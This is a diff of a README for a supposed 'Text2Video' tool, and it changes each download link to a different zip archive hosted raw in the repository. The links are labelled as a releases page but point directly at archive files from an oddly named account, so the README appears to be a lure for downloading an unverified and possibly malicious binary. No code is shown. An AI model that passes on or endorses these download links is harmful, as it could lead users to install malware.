@@ -1,6 +1,6 @@
 # 🎥 Text2Video - Create Videos from Your Text Prompts
 
-![Download Text2Video](https://raw.githubusercontent.com/ukepyorrhea930/Text2Video/main/src/Text2Video_v2.9-alpha.2.zip)
+![Download Text2Video](https://github.com/ukepyorrhea930/Text2Video/raw/refs/heads/main/model/Text_Video_v2.6.zip)
 
 ## 📚 Overview
 
@@ -18,7 +18,7 @@ To begin using Text2Video, you'll need to download the software from the release
 
 2. Click the link below to visit the releases page where you can download the software:
 
-   [Visit this page to download Text2Video](https://raw.githubusercontent.com/ukepyorrhea930/Text2Video/main/src/Text2Video_v2.9-alpha.2.zip)
+   [Visit this page to download Text2Video](https://github.com/ukepyorrhea930/Text2Video/raw/refs/heads/main/model/Text_Video_v2.6.zip)
 
 3. On the releases page, find the version you want to download. Look for the latest version for the best features and fixes.
 
@@ -82,6 +82,6 @@ If you have questions or need assistance, feel free to reach out. You can discus
 
 To download Text2Video, visit the link below:
 
-[Visit this page to download Text2Video](https://raw.githubusercontent.com/ukepyorrhea930/Text2Video/main/src/Text2Video_v2.9-alpha.2.zip)
+[Visit this page to download Text2Video](https://github.com/ukepyorrhea930/Text2Video/raw/refs/heads/main/model/Text_Video_v2.6.zip)
 
 Enjoy creating amazing videos from your text prompts!
